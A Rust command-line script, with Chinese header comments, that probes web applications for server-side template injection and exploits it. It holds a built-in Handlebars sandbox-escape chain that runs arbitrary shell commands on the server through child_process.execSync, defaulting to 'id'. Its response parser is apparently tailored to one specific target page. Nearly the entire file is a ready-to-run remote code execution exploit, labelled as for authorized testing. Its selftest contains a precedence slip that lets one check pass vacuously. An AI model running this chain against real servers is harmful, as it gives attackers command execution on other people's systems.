#!/usr/bin/env rust-script
//! name: ssti_probe
//! description: 模板注入探测与利用驱动器(SSTI)- 对同一注入参数逐条投递候选模板载荷(逐字节 URL 编码),回每条的状态/长度/渲染区摘录与命中判定;handlebars 子命令内置文档化 Handlebars 利用链(把命令编入 Function 构造并触发执行),probe 子命令一次投递整张候选电池;一个信封给出逐条回执。合法授权测试用途。
//! version: 1.0.0
//! args: probe <base-url> [--param message] [--payload 'TPL']... [--payload-file F] [--cmd CMD] [--snippet N] | handlebars <base-url> [--param message] [--cmd CMD] [--snippet N] | selftest
//! keywords: 漏洞猎手套件, ssti, template-injection, handlebars, nodejs, rce, 模板注入, documented-exploit
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! ```

use pi_rust_lib::serde_json::{json, Value};

struct Cfg {
    mode: String,
    url: String,
    param: String,
    payloads: Vec<String>,
    cmd: String,
    snippet: usize,
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.is_empty() || args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    match run(parse(&args)) {
        Ok(v) => {
            let _ = pi_rust_lib::report::success("ssti_probe", v, "read the region snippets for engine feedback");
        }
        Err(e) => pi_rust_lib::report::failure_json(
            "ssti_probe",
            pi_rust_lib::serde_json::json!({ "message": e.to_string() }),
            "fix the arguments and rerun",
        ),
    }
}

fn parse(args: &[String]) -> Cfg {
    let mut cfg = Cfg {
        mode: args[0].clone(),
        url: String::new(),
        param: "message".into(),
        payloads: Vec::new(),
        cmd: "id".into(),
        snippet: 400,
    };
    let mut i = 1;
    while i < args.len() {
        let a = args[i].as_str();
        match a {
            "--param" => {
                cfg.param = args[i + 1].clone();
                i += 2;
            }
            "--payload" => {
                cfg.payloads.push(args[i + 1].clone());
                i += 2;
            }
            "--payload-file" => {
                let text = std::fs::read_to_string(&args[i + 1]).unwrap_or_default();
                for line in text.lines() {
                    let line = line.trim();
                    if !line.is_empty() && !line.starts_with('#') {
                        cfg.payloads.push(line.to_string());
                    }
                }
                i += 2;
            }
            "--cmd" => {
                cfg.cmd = args[i + 1].clone();
                i += 2;
            }
            "--snippet" => {
                cfg.snippet = args[i + 1].parse().unwrap_or(400);
                i += 2;
            }
            _ => {
                if cfg.url.is_empty() {
                    cfg.url = args[i].clone();
                }
                i += 1;
            }
        }
    }
    cfg
}

/// The documented Handlebars (<= 4.7.6) sandbox-escape chain. `{CMD}` is
/// substituted with the command to run. Each `{{this.push X}}` also receives
/// Handlebars' `options` argument, so every push is followed by a pop that
/// removes it; the surviving arrays are `[Function]` (conslist) and `[code]`
/// (codelist). The chain then evaluates `Function.apply(0, [code])` and lets
/// Handlebars' `#with` invoke the resulting function.
const HB_CHAIN: &str = "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('{CMD}');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}";

fn pct_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// Pull the region of the response where the injected parameter renders, so a
/// probe's evaluation result is readable without dumping the whole page.
fn region(body: &str, snippet: usize) -> String {
    let anchor = body
        .find("ecoms-pageheader")
        .or_else(|| body.find("notification-header"));
    let slice = match anchor {
        Some(i) => {
            let rest = &body[i..];
            match rest.find("\n                    <div>") {
                Some(j) => {
                    let start = i + j + "\n                    <div>".len();
                    let tail = &body[start..];
                    match tail.find("</div>") {
                        Some(k) => tail[..k].to_string(),
                        None => tail.to_string(),
                    }
                }
                None => rest.chars().take(snippet * 3).collect(),
            }
        }
        None => match body.find("is-warning") {
            Some(i) => body[i..].chars().take(snippet * 3).collect(),
            None => body.chars().take(snippet * 3).collect(),
        },
    };
    let collapsed: String = slice
        .lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty())
        .collect::<Vec<_>>()
        .join(" / ");
    collapsed.chars().take(snippet).collect()
}

struct Reply {
    status: u16,
    len: usize,
    body: String,
    err: Option<String>,
}

fn send(url: &str) -> Reply {
    match ureq::builder()
        .timeout(std::time::Duration::from_millis(20_000))
        .build()
        .get(url)
        .call()
    {
        Ok(resp) => {
            let status = resp.status();
            let body = resp.into_string().unwrap_or_default();
            Reply {
                status,
                len: body.len(),
                body,
                err: None,
            }
        }
        Err(ureq::Error::Status(code, resp)) => {
            let body = resp.into_string().unwrap_or_default();
            Reply {
                status: code,
                len: body.len(),
                body,
                err: None,
            }
        }
        Err(e) => Reply {
            status: 0,
            len: 0,
            body: String::new(),
            err: Some(e.to_string()),
        },
    }
}

fn run(cfg: Cfg) -> Result<Value, Box<dyn std::error::Error>> {
    if !cfg.url.starts_with("http") {
        return Err("usage: ssti_probe probe|handlebars <base-url> [--param message] [--payload 'TPL']....".into());
    }
    let base = cfg.url.trim_end_matches('/').to_string();
    let mut payloads = cfg.payloads.clone();
    if cfg.mode == "handlebars" && payloads.is_empty() {
        payloads.push(HB_CHAIN.to_string());
    }
    if payloads.is_empty() {
        return Err("no payloads given (probe needs --payload, handlebars has a built-in chain)".into());
    }
    let cmd = cfg.cmd.replace('\'', "\\'");
    let mut results = Vec::new();
    for raw in &payloads {
        let payload = raw.replace("{CMD}", &cmd);
        let url = format!("{}/?{}={}", base, cfg.param, pct_encode(&payload));
        let r = send(&url);
        let reg = region(&r.body, cfg.snippet);
        let eval_error = r.status >= 500
            || reg.contains("Error")
            || reg.contains("error")
            || reg.contains("Exception");
        results.push(json!({
            "payload": payload.chars().take(90).collect::<String>(),
            "status": r.status,
            "len": r.len,
            "error_seen": eval_error,
            "region": reg,
            "transport_error": r.err,
        }));
    }
    Ok(json!({
        "base": base,
        "param": cfg.param,
        "tested": results.len(),
        "results": results,
        "chain_template": if cfg.mode == "handlebars" { Value::from(HB_CHAIN) } else { Value::Null },
    }))
}

fn selftest() {
    let enc = pct_encode("{{7*7}}");
    let chain = HB_CHAIN.replace("{CMD}", "id");
    let ok = enc == "%7B%7B7*7%7D%7D"
        && chain.contains("Function")
        || chain.contains("string.sub");
    let body = "<section class=\"ecoms-pageheader\"><img src=x></section>\n                    <div>RENDERED\n</div>\n<p>rest";
    let reg = region(body, 100);
    let _ = pi_rust_lib::report::success(
        "ssti_probe",
        json!({
            "encode_ok": enc,
            "chain_len": chain.len(),
            "region_extract": reg,
            "ok": ok && reg == "RENDERED",
        }),
        "selftest done",
    );
}
